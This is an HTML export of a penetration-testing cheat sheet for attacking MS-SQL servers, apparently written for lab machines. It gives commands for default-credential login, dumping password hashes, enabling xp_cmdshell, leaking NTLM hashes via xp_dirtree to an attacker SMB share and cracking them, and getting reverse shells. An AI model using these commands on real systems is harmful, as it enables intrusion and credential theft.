<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>1443 - MS-SQL</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Port 1443 - MS-SQL</h1></strong><br />Port 1433 is Microsoft&#39;s SQL database port.<br /><br /><strong><h3>Links</h3></strong><br />• <a href="http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/">http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/</a><br />• <a href="https://justgeeks.blogspot.com/2006/10/search-ms-sql-server-for-any-text.html">https://justgeeks.blogspot.com/2006/10/search-ms-sql-server-for-any-text.html</a><br />   ◇ search mssql server for any text by creating a stored procedure<br />• <a href="https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/">https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/</a> - sql injection cheat sheet<br />• <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md</a><br /><br /><strong><h3>Examples</h3></strong><br />• <em>hackthebox Tally</em><br /><br /><strong><h2>## About MS-SQL</h2></strong><br /><strong><h3>### MS-SQL Databases</h3></strong><br />• <code>master</code> - Records all the system-level info for an instance of the SQL server<br />• <code>msdb</code> - Used by the SQL Server Agent for scheduling alerts/jobs<br />• <code>model</code> - Used as the template for all future created databases<br />• <code>resource</code> - A read-only database that contains system objects<br />• <code>tempdb</code> - A work-space for holding temporary objects or imtermediate result sets<br /><br /><strong><h2>## Tips</h2></strong><br /><strong>Trying to get a shell wtih xp_cmdshell?</strong><br />Use <code>sqsh</code> instead of <code>mssqlclient.py</code>.<br />mssqlclient.py gives me errors about <code>/</code>.<br /><br /><strong><h2>## Checklist</h2></strong><br />• Gather info &amp; get version<br />   ◇ <code>nmap -p 1433 --script ms-sql* &lt;ip&gt;</code><br />   ◇ <code>msf&gt; use auxiliary/scanner/mssql/mssql_ping</code><br />• Check version for exploits<br />• No credentials?<br />   ◇ Try <code>sa / password</code><br />   ◇ Bruteforce<br />      ▪ BE CAREFUL, you can lock out accounts with too many incorrect attempts<br />• Connect with credentials<br />   ◇ <code>mssqlclient.py reporting@10.10.10.125 -windows-auth</code><br />   ◇ <code>sqsh -S 10.10.10.59 -U &lt;username&gt;</code> - better for xp_cmdshell<br /><br /><strong><h3>### With access</h3></strong><br />• Enumerate the database<br />   ◇ Check the databases, tables, columns etc.<br />   ◇ Check for password hashes<br />      ▪ <code>SELECT name, password FROM master..sysxlogins</code><br />      ▪ <code>select name, password_hash FROM master.sys.sql_logins</code><br />   ◇ Use metasploit - <code>auxiliary/admin/mssql/mssql_enum</code><br /><br />• Execute system commands - xp_cmdshell<br />   ◇ xp_cmdshell<br />      ▪ 1. Enable xp_cmdshell<br />         - <code>EXEC sp_configure &#39;xp_cmdshell&#39;,1</code><br />         - <code>RECONFIGURE​</code><br />      ▪ 2. Execute commands<br />         - <code>EXEC master..xp_cmdshell &#39;whoami&#39;</code><br />         - <code>EXEC master.sys.xp_cmdshell whoami</code><br />   ◇ Metasploit + xp_cmdshell<br />      ▪ <code>auxiliary/admin/mssql/mssql_exec</code><br /><br />• Read system files - xp_dirtree<br />   ◇ <code>EXEC master.sys.xp_dirtree &#39;\\10.10.14.181\heyshare&#39;</code><br /><br />• Grab MS-SQL user NTLM hash<br />   ◇ Manually<br />      1. Spawn a fake SMB share with Responder<br />         - <code>responder -I tun0</code><br />      2. Query our smb share with xp_dirtree<br />         - <code>EXEC master.sys.xp_dirtree &#39;\\10.10.14.181\heyshare&#39;</code><br />      3. Crack the hash with hashcat <br />         - <code>hashcat -m 5600 ntlmv2-hashes.txt /usr/share/wordlists/rockyou.txt -o ntlmv2-cracked.txt --force</code><br />   ◇ Metasploit<br />      ▪ <code>msf&gt; use auxiliary/admin/mssql/mssql_ntlm_stealer</code><br /><br />• Escalate from db_owner to sysadmin<br />   ◇ <code>msf&gt; use auxiliary/admin/mssql/mssql_escalate_dbowner</code><br /><br />• Impersonate other users and priv-esc within the DB<br />   ◇ <code>msf&gt; auxiliary/admin/mssql/mssql_escalate_execute_as</code><br /><br /><strong><h3>### With access -&gt; get system shell</h3></strong><br />• xp_cmdshell<br />   ◇ Alamot&#39;s mssql-shell - <a href="https://alamot.github.io/mssql_shell/">https://alamot.github.io/mssql_shell/</a><br />   ◇ Transfer nc.exe to target → run it with xp_cmdshell<br />   ◇ Powershell installed? - Try nishang reverse shell<br />   ◇ Add RDP user and connect via RDP<br />   ◇ Use metaplsoit <code>mssql_payload</code><br /></div>
</body>
</html>
